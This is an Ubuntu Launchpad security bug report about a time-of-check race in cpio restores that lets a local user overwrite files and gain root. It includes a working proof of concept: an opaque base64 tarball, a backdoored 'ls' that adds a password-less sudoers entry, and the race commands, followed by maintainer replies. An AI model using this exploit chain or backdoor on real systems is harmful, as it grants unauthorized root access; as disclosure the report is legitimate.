@@ -1,0 +1,117 @@
+Bug #577179: Timerace during restore of cpio dump allows overwrite of files with permissions of user running cpio
+
+URL: https://bugs.launchpad.net/ubuntu/+source/cpio/+bug/577179
+
+Metadata: security_related=true; information_type=Public Security; targets=cpio (Ubuntu) (Won't Fix, Low)
+
+Description:
+Cpio does not check for modifications of path (symlinks) while restoring a dump. A local user might modify the path while cpio is running, causing cpio to overwrite arbitrary files with permissions of the user running cpio. This might be especially interesting, when an unprivileged user can trigger a backup restore from a cpio dump, either via social engineering or a "restore my site" button, seen at some hosting providers. If the dump is restored using cpio running with root privileges, this will lead to privilege escalation.
+
+Here is an example how to replace "ls" with a backdoored variant during a backup/restore cycle of /home/test. The user to run a command is given in front of every command. Use two parallel shells, since the user has to be logged in during restore.
+
+Create user "test" (our bad user):
+
+root# useradd test --gid users
+root# mkdir /home/test
+root# chown test.users /home/test
+
+Login as user "test", extract poc
+
+test# base64 -d <<BASE64-EOF | tar -xjv
+QlpoOTFBWSZTWd18Ng8AAXr/hMwwAEB/f/+fb2ffj//v3/4AAQAIUAOw2Re7LlIRDJETCRpmjKej
+UZqPU09EyZMQ0NNHpNAGhkaASSJk0ExBiRHqbUyDTQ00NNANAAHpGhoCU0hCMTKT9UxpqbFNk9U0
+xqDQBo0ANDQ9QGQ4yZNGgNGmIyNDEMCaNMQYjQYQAGDUp6gB6QBkGQNABoAGmQAaAPUA+5y+7/bQ
+2walhCacARr6mo3Fr19UaoJCzjJJONgXI/uPXDrZ6c+/8KYT9DIvZvKzhNc4Pr7KNuuesWSVuyHH
+Pc+ZjO0mJXlqnJt9hMMgOCvmKHfx/7ipNXz5pn87S+0IaNmUafBLC1cc11b8yz6NJbpoupiEhvU4
+dtcUeaWvDO12B0iTJi14QojwRnlWjxZKKsfBRKc0oq3VZTyF/K8roGZ1tCf6QAaI6zNQT4hBlVJY
+goMTmEnW7+twx3VYdlQyYLQeKMyRMBjGFILDgn91NbtVV5IHbKARhESvIXJftPq4zPuxUb+GrZib
+Vo56RFqWep260zHXdRyyMg3YQNyHP0OEBCJd0qnkSN7lUCBLX5fRbqFg5pVFPuhg7bkVO7R4W+EC
+agqHET0RHsUV7FNMpya2HPt5OVaiDKCc4uKMSd2s8hLTV9yHlZC0RhWEnE2Bn1KCDR5+ixpwA3Wt
+SDvArHD+6iYwyh33DBIAH5CCUoOHBBJEUAwKKOEgpXITIOKCNTMyZnrjhQOzHSL7x5PbNuqzIUGC
+0Ej3yps85jLRU289efvUdoh8UVJCRmZGm0DxzUBTjFtLlWuJZViDJTIOouoxEsDcpBQX1yGayag5
+G8QNLW6+SEmDUKs4zuhOJm7b5Iytc0KBRxS8UIdCiZK92iZnRdFK2KMk3aGsqFif10PYxRhejRZi
+Zsx1JIIiod7kziZRQZTquK8rRMxM7hO68e+bcpVjVuhXCLL60XBZjpn3aYOrL6YMuzFIVJImi5Ok
+4LlLDUk/5PQbzBmwpJIC5hMZzWy0liZuhmlZt4Rqaeyt5WuJ2L0xDJgtYvYQkkIQZ7ccr4GbwtuT
+GNkGkxQ2aPtmxCTIK3SR2ImJiilKebcr5R4D2FecKL+G04KRncDJOZKQqtvU6ZBPyD2T0InGGJOt
+oqVVGGM+cv5kY22NQ+pyDeVRegrEi2qEn2XV17bZUZWTRrTnsgOnr065iRqg5USQZobjqLDRbHkK
+cjImCSc60nWkyxuf0ZRy/psOG40W22jTEeMgtEkRcfQ8TYM7CSWF32N1n2YOUzRAcgiA0zOO5LjK
+tzHfgnnwjMKFdRJiNRuNtM0Xo1ZDpOo3sCbknpiDiCvUqYTEL4K1SEArEqA0T+HkwxSS/4u5Ipwo
+SG6+GweA
+BASE64-EOF
+
+Compile the helper:
+
+test# gcc -o DirModifyInotify DirModifyInotify.c
+
+Prepare the user directory for the nightly backup job (all run as user test)
+
+cd /home/test
+mkdir -p root/adir
+dd if=/dev/zero bs=1M count=1 of=root/adir/afile
+mkdir root/bin
+cat <<EOF > root/bin/ls
+#!/bin/bash
+test -r /etc/shadow && echo "test ALL=NOPASSWD: ALL" >> /etc/sudoers
+exec /bin/ls2 "\$@"
+EOF
+chmod 0755 root/bin/ls
+cp -a /bin/ls root/bin/ls2
+
+Run nightly backup as root, this will run 100% as expected, producing a standard user home dir backup
+
+root# find /home/test/ | cpio -o > dump
+
+Run trap commands as user test in /home/test:
+
+test# rm -rf root/bin
+test# echo "Waiting for event .." >&2
+test# ./DirModifyInotify "root/" "root" "/"
+
+Restore backup as root while trap is running:
+
+root# cpio -i -d < dump
+
+Run "ls" as root, giving full root permissions to user "test" since backdoored ls will add password-less sudo for user test
+
+root# ls
+
+Perform sudo -s /bin/bash to get root
+
+test# sudo -s /bin/bash
+
+Done
+
+At first, this issue seemed similar to https://bugs.launchpad.net/ubuntu/+source/cpio/+bug/481662, but now I think, it has completely different cause. You might also want to look at http://www.halfdog.net/Software/SymlinksAndSecurity.html for some thoughts on that topic.
+
+$ lsb_release -rd
+Description:    Ubuntu 10.04 LTS
+Release:        10.04
+
+$ apt-cache policy cpio
+cpio:
+  Installed: 2.10-1ubuntu2
+  Candidate: 2.10-1ubuntu2
+  Version table:
+ *** 2.10-1ubuntu2 0
+        500 http://archive.ubuntu.com/ubuntu/ lucid/main Packages
+        100 /var/lib/dpkg/status
+
+Discussion:
+Message 2 | Author: mdeslaur | Subject: Re: Timerace during restore of cpio dump allows overwrite of files with permissions of user running cpio
+Hi,
+
+Have you contacted upstream about this issue? Since it is a flaw in the way cpio is designed, it would be better to contact upstream directly to communicate your findings and to get them to issue a proper fix. Thanks.
+
+Please keep us informed of any progress they make in correcting this.
+
+---
+Message 3 | Author: halfdog | Subject: Re: Timerace during restore of cpio dump allows overwrite of files with permissions of user running cpio
+Sergey Pohnyakoff is tar and cpio-dev, same bug already fixed in tar, so they know. Apart from that, since nearly every backup software is vulnerable, US-Cert should have done the contacting (see VU#278501 - ubuntu as distributor should have been contacted also).
+
+---
+Message 4 | Author: jdstrand | Subject: Re: Timerace during restore of cpio dump allows overwrite of files with permissions of user running cpio
+Marking public as information is in http://www.halfdog.net/Security/2010/FilesystemRecursionAndSymlinks/.
+
+---
+Message 5 | Author: jdstrand | Subject: Re: Timerace during restore of cpio dump allows overwrite of files with permissions of user running cpio
+Ubuntu won't diverge from upstream and Debian on this fix, so I am marking the Ubuntu task as "Won't Fix" for now. I looked but could not find bugs for this with upstream and Debian. If these are known please add to this bug and we can reopen. Thanks.
